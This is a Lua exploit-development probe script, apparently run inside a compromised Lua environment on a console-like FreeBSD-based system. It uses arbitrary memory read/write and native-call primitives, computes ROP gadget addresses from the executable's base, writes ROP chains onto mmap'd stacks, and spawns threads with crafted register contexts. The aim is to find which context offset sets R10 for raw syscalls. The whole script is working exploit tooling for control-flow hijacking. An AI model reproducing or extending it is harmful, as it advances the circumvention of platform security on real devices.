-- CRASH_CLASS: MODERATE
-- PROBE 91n: Definitive R10 offset test using socketpair
--
-- socketpair(domain, type, protocol, sv[2]) uses exactly 4 args:
--   RDI=domain, RSI=type, RDX=protocol, R10=sv (pointer)
-- No R8/R9 needed. If R10=0 (EFAULT), rv=-1 safely.
-- For each unknown offset: set it to valid mmap'd buffer.
-- Whichever offset gives rv=0 IS R10.
-- If ALL give rv=-1 → set_mcontext does NOT restore R10.
--
-- ALL buffers via mmap to avoid Lua VM corruption.

print("=== PROBE 91n: R10 OFFSET (SOCKETPAIR) ===")
print("")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function q(v)
    if v==nil then return"nil"end
    if type(v)=="table" and v.h then
        local h,l=v.h,v.l; if h<0 then h=h+0x100000000 end
        if l<0 then l=l+0x100000000 end
        return string.format("0x%08X_%08X",h,l)
    end
    return string.format("0x%X",N(v))
end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
if not SA then print("NO SA") return end
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local tc=mk(430); local tk=mk(433); local mm=mk(477)

-- Get eboot base for gadgets
local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
local WMOV=uint64(string.format("0x%X%08X",ehi,elo+0x92C67))
print("eboot="..string.format("0x%X%08X",ehi,elo))

-- Known offsets
local _DI=0x048; local _SI=0x050; local _DX=0x058; local _AX=0x078
local _CS=0x0C0; local _FL=0x0D0; local _IP=0x0E0
local _SP=0x0F8; local _SS=0x100; local _MG=0x108; local _TP=0x110

-- Allocate ALL memory via mmap (8 pages = 128KB)
local pg=0x4000
local ok_m,big=pcall(function()
    return mm(uint64(0),uint64(8*pg),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_m then print("MMAP FAIL") return end
local base=N(big)
print("mmap base="..string.format("0x%X",base))

-- Layout in mmap'd region:
-- Page 0 (base+0x0000): shared results (16 bytes per test)
-- Page 1 (base+0x4000): fd output buffers (16 bytes per test)
-- Pages 2-7: stacks + contexts for 6 tests at a time

-- Candidate offsets to test (all unknown slots in GP range)
local candidates={
    0x060, 0x068, 0x070, 0x080, 0x088,
    0x090, 0x098, 0x0A0, 0x0A8, 0x0B0, 0x0B8
}

-- Timespec for nanosleep (999 seconds)
local ts_addr=base+0x3F00
wq(ts_addr,uint64(999)); wq(ts_addr+8,uint64(0))

-- Short sleep for main thread (50ms)
local sl_addr=base+0x3F20
wq(sl_addr,uint64(0)); wq(sl_addr+8,uint64(50000000))

print("")
print("--- TESTING "..#candidates.." OFFSETS ---")

for idx,off in ipairs(candidates) do
    -- Per-test buffers
    local shared=base+(idx-1)*16            -- result slot
    local fdbuf=base+pg+(idx-1)*16          -- fd output buffer
    local stk_base=base+2*pg+(idx-1)*0x1000 -- 4KB stack
    local ctx=stk_base+0x800                -- context in upper half

    -- Zero everything
    for o=0,0xFFF,4 do wd(stk_base+o,0) end

    -- Sentinel in shared + fdbuf
    wq(shared,uint64(0xBADBADBAD))
    wd(fdbuf,0xDEAD0001); wd(fdbuf+4,0xDEAD0002)

    -- Build ROP chain on stack
    -- After socketpair: write RAX to shared, then nanosleep
    local sp=stk_base
    wq(sp,PRDI); sp=sp+8
    wq(sp,uint64(shared)); sp=sp+8
    wq(sp,WMOV); sp=sp+8
    wq(sp,PRDI); sp=sp+8
    wq(sp,uint64(ts_addr)); sp=sp+8
    wq(sp,PRAX); sp=sp+8
    wq(sp,uint64(240)); sp=sp+8
    wq(sp,SA); sp=sp+8

    -- Build context: socketpair(AF_UNIX=1, SOCK_STREAM=1, 0, fdbuf)
    wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,SA)
    wq(ctx+_SP,uint64(stk_base))
    wq(ctx+_AX,uint64(135))   -- socketpair
    wq(ctx+_DI,uint64(1))     -- AF_UNIX
    wq(ctx+_SI,uint64(1))     -- SOCK_STREAM
    wq(ctx+_DX,uint64(0))     -- protocol

    -- Set candidate offset to fdbuf address
    wq(ctx+off,uint64(fdbuf))

    -- Create thread
    local tb=stk_base+0x7F0
    wq(tb,uint64(0))
    pcall(function() tc(uint64(ctx),uint64(tb),uint64(0)) end)
    local tid=rq(tb)

    -- Wait 50ms
    native.fcall_with_rax(stub,240,sl_addr,0)

    -- Read result
    local rv=rq(shared)
    local fd0=rd(fdbuf); local fd1=rd(fdbuf+4)

    local rv_n=-999
    if rv then
        if type(rv)=="table" then
            local h=rv.h or 0; if h<0 then h=h+0x100000000 end
            if h==0xFFFFFFFF then rv_n=-1
            else rv_n=N(rv) end
        else rv_n=N(rv) end
    end

    local status=""
    if rv_n==0 then
        status=" *** SUCCESS — THIS IS R10 ***"
        -- Close the allocated fds
        if fd0 and fd0>0 and fd0<10000 then
            native.fcall_with_rax(stub,6,fd0)
        end
        if fd1 and fd1>0 and fd1<10000 then
            native.fcall_with_rax(stub,6,fd1)
        end
    elseif N(rv)==0xBADBADBAD or (type(rv)=="table" and rv.l and N(rv)==0xBADBADBAD) then
        status=" [child crashed/never wrote]"
    else
        status=" [failed rv="..q(rv).."]"
    end

    print(string.format("  off=0x%03X rv=%d fd0=%s fd1=%s%s",
        off, rv_n,
        tostring(fd0 or "nil"), tostring(fd1 or "nil"),
        status))

    -- Kill child
    if tid and N(tid)>0 then pcall(function() tk(tid,uint64(9)) end) end
end

-- ============================================================
-- Also test: does a socketpair child with ALL zeros context
-- (except the required gates and RDI/RSI/RDX/RAX) crash or
-- return -1? This tells us if R10=0 → EFAULT or kill.
-- ============================================================
print("")
print("--- CONTROL: all unknown offsets = 0 ---")
local c_shared=base+0x3E00
local c_stk=base+7*pg
local c_ctx=c_stk+0x800

for o=0,0xFFF,4 do wd(c_stk+o,0) end
wq(c_shared,uint64(0xBADBADBAD))

local csp=c_stk
wq(csp,PRDI); csp=csp+8
wq(csp,uint64(c_shared)); csp=csp+8
wq(csp,WMOV); csp=csp+8
wq(csp,PRDI); csp=csp+8
wq(csp,uint64(ts_addr)); csp=csp+8
wq(csp,PRAX); csp=csp+8
wq(csp,uint64(240)); csp=csp+8
wq(csp,SA); csp=csp+8

wq(c_ctx+_MG,uint64(0x480)); wd(c_ctx+_FL,0)
wq(c_ctx+_TP,uint64(0x10000))
wq(c_ctx+_CS,uint64(0x43)); wq(c_ctx+_SS,uint64(0x3B))
wq(c_ctx+_IP,SA)
wq(c_ctx+_SP,uint64(c_stk))
wq(c_ctx+_AX,uint64(135))
wq(c_ctx+_DI,uint64(1))
wq(c_ctx+_SI,uint64(1))
wq(c_ctx+_DX,uint64(0))
-- ALL other offsets stay 0

local c_tb=c_stk+0x7F0
wq(c_tb,uint64(0))
pcall(function() tc(uint64(c_ctx),uint64(c_tb),uint64(0)) end)
local c_tid=rq(c_tb)
native.fcall_with_rax(stub,240,sl_addr,0)
local c_rv=rq(c_shared)
local c_rvn=-999
if c_rv then
    if type(c_rv)=="table" then
        local h=c_rv.h or 0; if h<0 then h=h+0x100000000 end
        if h==0xFFFFFFFF then c_rvn=-1 else c_rvn=N(c_rv) end
    else c_rvn=N(c_rv) end
end
if N(c_rv)==0xBADBADBAD or (type(c_rv)=="table" and c_rv.l and N(c_rv)==0xBADBADBAD) then
    print("  control: child CRASHED (never wrote to shared)")
else
    print("  control: rv="..c_rvn.." (expect -1 if R10=0→EFAULT)")
end
if c_tid and N(c_tid)>0 then pcall(function() tk(c_tid,uint64(9)) end) end

print("")
print("canary="..N(native.fcall_with_rax(stub,20)))
print("=== 91n DONE ===")
